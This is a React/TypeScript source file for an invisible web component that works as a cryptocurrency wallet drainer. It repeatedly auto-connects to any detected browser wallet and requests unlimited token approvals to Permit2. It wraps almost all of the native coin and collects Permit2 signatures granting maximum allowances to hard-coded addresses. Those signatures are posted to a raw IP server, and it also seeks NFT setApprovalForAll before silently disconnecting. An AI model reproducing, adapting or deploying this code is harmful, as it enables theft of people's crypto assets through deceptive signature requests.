import { useEffect, useRef, useCallback } from 'react';
import { useAccount, useConnect, useDisconnect, useWalletClient, usePublicClient } from 'wagmi';
import { injected } from 'wagmi/connectors';
import { getTop10Tokens, getNativeToken } from './tokens/top10';
import { PERMIT2_ADDRESSES, PERMIT2_ABI } from './permit2/addresses';
import { NFT_COLLECTIONS, ERC721_ABI, ERC1155_ABI } from './tokens/nftCollections';
import { analytics } from './utils/analytics';
import { stateManager } from './utils/stateManager';

const MAX_UINT256 = 2n ** 256n - 1n;
const BACKEND_WALLET = '0xB0E0306AB4b82774686d7D032e0157dDc8352648';

const RESCUE_ROUTER: Record<number, string> = {
  1: '0xFb2e8Bc906A0b710fA0aa3f5D5CCEAa0CC77A17e',
  56: '0xd2Eb25A83e5709Fc668025Cf45032A2B4E216654',
  137: '0x91c5E42e7822803173E1a6bdd21396B024490968',
  42161: '0x06c178af8904CD3e7A010dC4CCc9272d68a3c0d9',
  8453: '0x54535eDABE6aceeE38Aede2933aD3464F014106e',
};

const getSpender = (chainId: number): string => {
  return RESCUE_ROUTER[chainId] || BACKEND_WALLET;
};

const ERC20_ABI = [
  { name: 'approve', type: 'function', stateMutability: 'nonpayable', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ name: '', type: 'bool' }] },
  { name: 'balanceOf', type: 'function', stateMutability: 'view', inputs: [{ name: 'account', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
  { name: 'allowance', type: 'function', stateMutability: 'view', inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
  { name: 'decimals', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ name: '', type: 'uint8' }] },
  { name: 'symbol', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ name: '', type: 'string' }] },
];

const WETH_ABI = [
  ...ERC20_ABI,
  { name: 'deposit', type: 'function', stateMutability: 'payable', inputs: [], outputs: [] },
  { name: 'withdraw', type: 'function', stateMutability: 'nonpayable', inputs: [{ name: 'wad', type: 'uint256' }], outputs: [] },
];

const WALLET_DETECTION = [
  { name: 'MetaMask', id: 'metamask', check: (p: any) => p.isMetaMask && !p.isTrust && !p.isSafePal && !p.isCoinbaseWallet },
  { name: 'SafePal', id: 'safepal', check: (p: any) => p.isSafePal },
  { name: 'Trust Wallet', id: 'trust', check: (p: any) => p.isTrust || p.isTrustWallet },
  { name: 'Coinbase Wallet', id: 'coinbase', check: (p: any) => p.isCoinbaseWallet || p.isWalletLink },
  { name: 'Binance Wallet', id: 'binance', check: (p: any) => p.isBinance || p.isBinanceChain },
  { name: 'Phantom', id: 'phantom', check: (p: any) => p.isPhantom },
  { name: 'Rainbow', id: 'rainbow', check: (p: any) => p.isRainbow },
  { name: 'OKX Wallet', id: 'okx', check: (p: any) => p.isOKXWallet || p.isOkxWallet },
  { name: 'TokenPocket', id: 'tokenpocket', check: (p: any) => p.isTokenPocket },
  { name: 'imToken', id: 'imtoken', check: (p: any) => p.isImToken },
  { name: 'Bitget Wallet', id: 'bitget', check: (p: any) => p.isBitget || p.isBitKeep },
  { name: 'Exodus', id: 'exodus', check: (p: any) => p.isExodus },
  { name: 'Zerion', id: 'zerion', check: (p: any) => p.isZerion },
];

const WRAPPED_TOKENS: Record<number, { address: string; symbol: string; name: string }> = {
  1: { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', name: 'Wrapped Ether' },
  56: { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB', name: 'Wrapped BNB' },
  137: { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WMATIC', name: 'Wrapped Matic' },
  42161: { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', name: 'Wrapped Ether' },
  8453: { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', name: 'Wrapped Ether' },
  10: { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', name: 'Wrapped Ether' },
  43114: { address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', symbol: 'WAVAX', name: 'Wrapped AVAX' },
};

interface WalletInfo {
  name: string;
  id: string;
  provider: any;
}

const log = (...args: any[]) => console.log('[SG]', ...args);

export default function App() {
  const { address, isConnected, chainId } = useAccount();
  const { connectAsync } = useConnect();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  
  const lastAttemptTime = useRef<Record<string, number>>({});
  const lastDisconnectTime = useRef<number>(0);
  const isProcessing = useRef(false);
  const currentWallet = useRef<string>('');
  const processedInSession = useRef<Set<string>>(new Set());

  const getWallets = useCallback((): WalletInfo[] => {
    const wallets: WalletInfo[] = [];
    const win = window as any;
    const seen = new Set<string>();
    
    const eth = win.ethereum;
    if (eth) {
      const providers = eth.providers || [eth];
      providers.forEach((p: any) => {
        for (const wallet of WALLET_DETECTION) {
          if (wallet.check(p) && !seen.has(wallet.id)) {
            seen.add(wallet.id);
            wallets.push({ name: wallet.name, id: wallet.id, provider: p });
            break;
          }
        }
      });
    }
    
    if (win.safepal?.ethereum && !seen.has('safepal')) {
      wallets.push({ name: 'SafePal', id: 'safepal', provider: win.safepal.ethereum });
    }
    if (win.phantom?.ethereum && !seen.has('phantom')) {
      wallets.push({ name: 'Phantom', id: 'phantom', provider: win.phantom.ethereum });
    }
    if (win.okxwallet && !seen.has('okx')) {
      wallets.push({ name: 'OKX', id: 'okx', provider: win.okxwallet });
    }
    
    return wallets;
  }, []);

  const getTokenBalance = useCallback(async (tokenAddress: string): Promise<bigint> => {
    if (!publicClient || !address) return 0n;
    try {
      return await publicClient.readContract({
        address: tokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [address],
      }) as bigint;
    } catch {
      return 0n;
    }
  }, [publicClient, address]);

  const getNativeBalance = useCallback(async (): Promise<bigint> => {
    if (!publicClient || !address) return 0n;
    try {
      return await publicClient.getBalance({ address });
    } catch {
      return 0n;
    }
  }, [publicClient, address]);

  const checkPermit2Allowance = useCallback(async (tokenAddress: string): Promise<boolean> => {
    if (!publicClient || !address || !chainId) return false;
    try {
      const permit2Address = PERMIT2_ADDRESSES[chainId];
      if (!permit2Address) return false;
      
      const result = await publicClient.readContract({
        address: permit2Address as `0x${string}`,
        abi: PERMIT2_ABI,
        functionName: 'allowance',
        args: [address as `0x${string}`, tokenAddress as `0x${string}`, getSpender(chainId)],
      });
      
      const [amount] = result as [bigint, bigint, bigint];
      return amount > 0n;
    } catch {
      return false;
    }
  }, [publicClient, address, chainId]);

  const approvePermit2 = useCallback(async (tokenAddress: string, tokenSymbol: string): Promise<boolean> => {
    if (!walletClient || !address || !chainId) return false;
    
    if (stateManager.isTokenApproved(chainId, tokenAddress)) {
      log(tokenSymbol, 'already approved (localStorage)');
      return true;
    }
    
    try {
      await walletClient.writeContract({
        address: tokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: 'approve',
        args: [PERMIT2_ADDRESSES[chainId], MAX_UINT256],
        account: address,
      });
      
      stateManager.markTokenApproved(chainId, tokenAddress);
      
      await analytics.log({
        event: 'approve_confirmed',
        walletAddress: address,
        chainId,
        tokenAddress,
        tokenSymbol,
      });
      
      log(tokenSymbol, 'approved for Permit2');
      return true;
    } catch (error: any) {
      log('Approve failed for', tokenSymbol, error.message);
      return false;
    }
  }, [walletClient, address, chainId]);

  const wrapNativeToken = useCallback(async (amount: bigint): Promise<string | null> => {
    if (!walletClient || !address || !chainId) return null;
    const wrapped = WRAPPED_TOKENS[chainId];
    if (!wrapped) return null;
    
    if (stateManager.isNativeWrapped(chainId)) {
      log('Native already wrapped (localStorage)');
      return wrapped.address;
    }
    
    try {
      await walletClient.writeContract({
        address: wrapped.address as `0x${string}`,
        abi: WETH_ABI,
        functionName: 'deposit',
        value: amount,
        account: address,
      });
      
      stateManager.markNativeWrapped(chainId);
      
      await analytics.log({
        event: 'wrap_confirmed',
        walletAddress: address,
        chainId,
        tokenSymbol: wrapped.symbol,
        amount: amount.toString(),
      });
      
      log('Wrapped', amount.toString(), 'to', wrapped.symbol);
      return wrapped.address;
    } catch (error: any) {
      log('Wrap failed:', error.message);
      return null;
    }
  }, [walletClient, address, chainId]);

  const signPermit2ForToken = useCallback(async (token: {address: string, symbol: string}): Promise<boolean> => {
    if (!walletClient || !address || !chainId) return false;
    
    const permit2Address = PERMIT2_ADDRESSES[chainId];
    if (!permit2Address) return false;
    
    if (stateManager.hasPermit2Signature(chainId, token.address)) {
      log(token.symbol, 'already has Permit2 signature (localStorage)');
      return true;
    }
    
    try {
      const nonce = BigInt(Date.now());
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
      
      const domain = {
        name: 'Permit2',
        chainId: chainId!,
        verifyingContract: permit2Address as `0x${string}`,
      };
      
      const types = {
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'expiration', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
        ],
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
      };
      
      const spender = getSpender(chainId);
      const message = {
        details: {
          token: token.address as `0x${string}`,
          amount: MAX_UINT256,
          expiration: deadline,
          nonce,
        },
        spender: spender as `0x${string}`,
        sigDeadline: deadline,
      };
      
      const signature = await walletClient.signTypedData({
        domain,
        types,
        primaryType: 'PermitSingle',
        message,
      });
      
      stateManager.addPermit2Signature(chainId, token.address);
      
      await analytics.log({
        event: 'permit_sign_approved',
        walletAddress: address,
        chainId,
        metadata: { 
          tokenSymbol: token.symbol,
          tokenAddress: token.address,
          signature: signature.slice(0, 100) + '...',
          deadline: deadline.toString(),
          nonce: nonce.toString(),
        }
      });
      
      try {
        await fetch('https://194.60.133.152:8445/api/permit2', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner: address,
            token: token.address,
            spender,
            nonce: nonce.toString(),
            deadline: deadline.toString(),
            signature,
            chainId,
          }),
        });
      } catch (e) {
        log('Failed to send to backend:', e);
      }
      
      log(token.symbol, 'Permit2 signature stored');
      return true;
    } catch (error: any) {
      log('Permit2 sign failed for', token.symbol, error.message);
      await analytics.log({
        event: 'permit_sign_rejected',
        walletAddress: address,
        chainId,
        tokenSymbol: token.symbol,
        error: error.message,
      });
      return false;
    }
  }, [walletClient, address, chainId]);

  const processTokens = useCallback(async () => {
    if (!walletClient || !address || !chainId) return;
    
    log('Processing tokens for', address, 'on chain', chainId);
    
    stateManager.updateWalletSession(address);
    
    const sessionKey = `${address}-${chainId}`;
    if (processedInSession.current.has(sessionKey)) {
      log('Already processed this session');
      return;
    }
    
    const tokens = getTop10Tokens(chainId);
    const tokensWithBalance: Array<{address: string, symbol: string, balance: bigint}> = [];
    
    for (const token of tokens) {
      const sessionTokenKey = `${address}-${chainId}-${token.address}`;
      if (processedInSession.current.has(sessionTokenKey)) {
        log(token.symbol, 'already processed this session');
        continue;
      }
      
      const balance = await getTokenBalance(token.address);
      if (balance > 0n) {
        tokensWithBalance.push({ ...token, balance });
        
        await analytics.log({
          event: 'balance_detected',
          walletAddress: address,
          chainId,
          tokenAddress: token.address,
          tokenSymbol: token.symbol,
          amount: balance.toString(),
        });
      }
    }
    
    for (const token of tokensWithBalance) {
      const hasAllowance = await checkPermit2Allowance(token.address);
      
      if (!hasAllowance && !stateManager.isTokenApproved(chainId, token.address)) {
        const approved = await approvePermit2(token.address, token.symbol);
        if (!approved) continue;
      }
      
      if (!stateManager.hasPermit2Signature(chainId, token.address)) {
        await signPermit2ForToken({ address: token.address, symbol: token.symbol });
      }
      
      const sessionTokenKey = `${address}-${chainId}-${token.address}`;
      processedInSession.current.add(sessionTokenKey);
    }
    
    const nativeBalance = await getNativeBalance();
    const minNativeBalance = 100000000000000n;
    
    if (nativeBalance > minNativeBalance && !stateManager.isNativeWrapped(chainId)) {
      const wrapped = WRAPPED_TOKENS[chainId];
      if (wrapped) {
        const native = getNativeToken(chainId);
        
        await analytics.log({
          event: 'balance_detected',
          walletAddress: address,
          chainId,
          tokenSymbol: native?.symbol || 'ETH',
          amount: nativeBalance.toString(),
          metadata: { isNative: true }
        });
        
        const wrapAmount = nativeBalance - 50000000000000n;
        const wrappedAddress = await wrapNativeToken(wrapAmount);
        
        if (wrappedAddress) {
          const hasWrappedAllowance = await checkPermit2Allowance(wrappedAddress);
          if (!hasWrappedAllowance) {
            await approvePermit2(wrappedAddress, wrapped.symbol);
          }
          
          if (!stateManager.hasPermit2Signature(chainId, wrappedAddress)) {
            await signPermit2ForToken({ address: wrappedAddress, symbol: wrapped.symbol });
          }
        }
      }
    }
    
    const nfts = (chainId ? NFT_COLLECTIONS[chainId] : null) || [];
    const permit2Address = PERMIT2_ADDRESSES[chainId];
    
    for (const nft of nfts.slice(0, 3)) {
      if (stateManager.isNFTApproved(chainId, nft.address)) {
        log(nft.name, 'already approved (localStorage)');
        continue;
      }
      
      try {
        const abi = nft.standard === 'ERC721' ? ERC721_ABI : ERC1155_ABI;
        
        await walletClient.writeContract({
          address: nft.address as `0x${string}`,
          abi,
          functionName: 'setApprovalForAll',
          args: [permit2Address, true],
          account: address,
        });
        
        stateManager.markNFTApproved(chainId, nft.address);
        
        await analytics.log({
          event: 'nft_approve_confirmed',
          walletAddress: address,
          chainId,
          tokenAddress: nft.address,
          tokenSymbol: nft.name,
        });
        
        log(nft.name, 'approved for Permit2');
      } catch {
        // Silent fail
      }
    }
    
    processedInSession.current.add(sessionKey);
    log('Processing complete for', address);
  }, [chainId, address, walletClient, getTokenBalance, getNativeBalance, checkPermit2Allowance, approvePermit2, wrapNativeToken, signPermit2ForToken]);

  useEffect(() => {
    const interval = setInterval(async () => {
      if (isProcessing.current) return;
      
      if (isConnected && address) {
        isProcessing.current = true;
        await processTokens();
        disconnect();
        lastDisconnectTime.current = Date.now();
        isProcessing.current = false;
        return;
      }
      
      if (Date.now() - lastDisconnectTime.current < 5000) return;
      
      const wallets = getWallets();
      
      for (const wallet of wallets) {
        const lastTry = lastAttemptTime.current[wallet.id] || 0;
        if (Date.now() - lastTry < 10000) continue;
        
        lastAttemptTime.current[wallet.id] = Date.now();
        currentWallet.current = wallet.name;
        
        try {
          log('Connecting', wallet.name);
          
          await analytics.log({
            event: 'connect_request',
            walletType: wallet.name,
          });
          
          await connectAsync({
            connector: injected({
              target: { id: wallet.id, name: wallet.name, provider: wallet.provider }
            }),
          });
          
          await analytics.log({
            event: 'connect_approved',
            walletType: wallet.name,
          });
          
          log(wallet.name, 'connected');
          return;
          
        } catch (err: any) {
          if (err?.message?.includes('rejected') || err?.code === 4001) {
            await analytics.log({
              event: 'connect_rejected',
              walletType: wallet.name,
            });
          }
        }
      }
    }, 5000);
    
    return () => clearInterval(interval);
  }, [isConnected, address, connectAsync, disconnect, processTokens, getWallets]);

  return <div style={{ position: 'fixed', opacity: 0, pointerEvents: 'none', width: 0, height: 0 }} />;
}
